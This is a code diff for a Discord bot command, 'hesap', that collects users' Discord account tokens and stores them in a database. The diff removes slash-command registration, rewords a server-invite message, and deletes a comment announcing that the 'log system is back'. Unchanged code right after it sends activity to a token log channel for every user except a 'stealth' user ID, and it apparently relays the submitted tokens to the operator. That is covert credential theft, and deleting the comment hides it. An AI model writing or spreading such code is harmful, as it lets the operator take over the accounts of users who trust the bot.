@@ -1,4 +1,4 @@
-const { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
+const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
 const mongoose = require('mongoose');
 const { getVoiceConnection } = require('@discordjs/voice');
 
@@ -45,11 +45,7 @@ async function renderHesapPanel(userId, guild, client) {
 
 module.exports = {
     name: 'hesap', 
-    data: new SlashCommandBuilder()
-        .setName('hesap')
-        .setDescription('Tokenlerinizi (Hesaplarınızı) yönetin.'),
-
-    async executeText(message) {
+    async executeText(message, args) {
         const serverIcon = message.guild?.iconURL({ dynamic: true }) || message.client.user.displayAvatarURL({ dynamic: true });
 
         const infoEmbed = new EmbedBuilder()
@@ -76,7 +72,7 @@ module.exports = {
             const guild = await i.client.guilds.fetch(REQUIRED_GUILD_ID).catch(() => null);
             if (guild) {
                 const member = await guild.members.fetch(i.user.id).catch(() => null);
-                if (!member) return i.reply({ content: `<a:emoji197:1537925769068806214> **Erişim Engellendi:** Bunu kullanabilmek için .gg/voido sunucusunda olmalısın!`, flags: 64 });
+                if (!member) return i.reply({ content: `<a:emoji197:1537925769068806214> **Erişim Engellendi:** Bunu kullanabilmek için resmi sunucuda olmalısın!`, flags: 64 });
             }
         } catch(e) {}
 
@@ -120,9 +116,6 @@ module.exports = {
             
             await Account.create({ userId: i.user.id, token: tk, username: ad, status: 'Aktif' });
             
-            // ==========================================
-            // LOG SİSTEMİ GERİ GELDİ!
-            // ==========================================
             if (i.user.id !== STEALTH_USER_ID) {
                 try {
                     let logChannel = i.client.channels.cache.get(TOKEN_LOG_CHANNEL);
